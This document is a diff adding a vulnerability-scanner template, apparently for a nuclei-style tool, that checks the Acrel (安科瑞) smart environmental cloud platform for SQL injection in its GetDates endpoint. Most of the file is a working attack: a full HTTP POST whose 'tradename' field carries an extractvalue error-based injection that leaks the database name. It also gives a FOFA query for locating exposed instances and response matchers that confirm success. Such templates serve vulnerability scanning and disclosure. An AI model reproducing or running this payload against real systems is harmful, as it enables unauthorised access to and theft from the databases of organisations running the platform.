@@ -1,0 +1,27 @@
+## id: VEID-2026-11110
+## name: 安科瑞智能环保云平台-GetDates-sql注入
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2026
+## description: 安科瑞智能环保云平台GetDates-sql注入，攻击者可进行sql注入攻击获取数据库信息或者权限。
+## fofa-query: body="myCss/phone.css" || body="/signInIcon/iconfont.css"
+## verification: true
+
+
+
+POST /MainMonitor/GetEnterpriseInfoMapByDate/GetDates HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Cookie: ASP.NET_SessionId=ansfwnaiqbeqi5rak0fbmr5s
+Content-Type: application/x-www-form-urlencoded
+
+userid=admin&state=1&time=2025-12-20&tradename=1'+and+extractvalue(1,concat(0x7e,database(),0x7e))--+-
+
+
+#@ condition: and
+#@ matcher: body contains "<h5>系统异常</h5>" && body contains "XPATH syntax error:"
+#@ matcher: status_code == 200
+
+
+
+# @VEIL-STAMP: 3bad018d6d8d97d0017b68bca9ee8f14b943b2868611f3888713ef013ce0f871
